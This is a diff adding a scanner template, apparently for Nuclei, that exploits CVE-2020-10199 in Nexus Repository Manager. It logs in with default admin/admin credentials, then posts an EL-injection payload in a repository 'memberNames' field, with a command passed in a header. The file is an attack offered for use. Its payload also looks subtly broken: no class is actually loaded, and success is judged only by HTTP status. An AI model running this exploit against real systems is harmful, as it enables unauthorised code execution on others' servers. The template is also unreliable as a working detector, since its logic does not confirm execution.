@@ -1,0 +1,72 @@
+id: nexus-rce-cve-2020-10199
+
+info:
+  name: Nexus Repository Manager 3.21.1 Post-Auth RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Nexus Repository Manager OSS/Pro 3.21.1 and earlier contain an arbitrary EL expression injection vulnerability. Exploitation requires valid user credentials.
+  reference:
+    - https://support.sonatype.com/hc/en-us/articles/360044882533
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.0
+    cve-id: CVE-2020-10199
+
+variables:
+  username: "admin"
+  password: "admin"
+  command: "whoami"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: login
+    method: POST
+    path:
+      - "{{BaseURL}}/service/rapture/session"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Requested-With: XMLHttpRequest
+      X-Nexus-UI: true
+    body: "username={{base64(username)}}&password={{base64(password)}}"
+    extractors:
+      - type: regex
+        name: nxsessionid
+        group: 1
+        regex:
+          - "NXSESSIONID=(.*?);"
+        internal: true
+    matchers:
+      - type: status
+        status:
+          - 204
+
+  - id: execute-command
+    method: POST
+    path:
+      - "{{BaseURL}}/service/rest/beta/repositories/go/group"
+    headers:
+      Content-Type: application/json
+      X-Requested-With: XMLHttpRequest
+      X-Nexus-UI: true
+      NX-ANTI-CSRF-TOKEN: "0.715356897422781"
+      Cookie: "NX-ANTI-CSRF-TOKEN=0.715356897422781;NXSESSIONID={{nxsessionid}}"
+      404: "{{command}}"
+    body: |
+      {
+        "name": "internal",
+        "online": true,
+        "storage": {
+          "blobStoreName": "default",
+          "strictContentTypeValidation": true
+        },
+        "group": {
+          "memberNames": ["${' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance()}"]
+        }
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
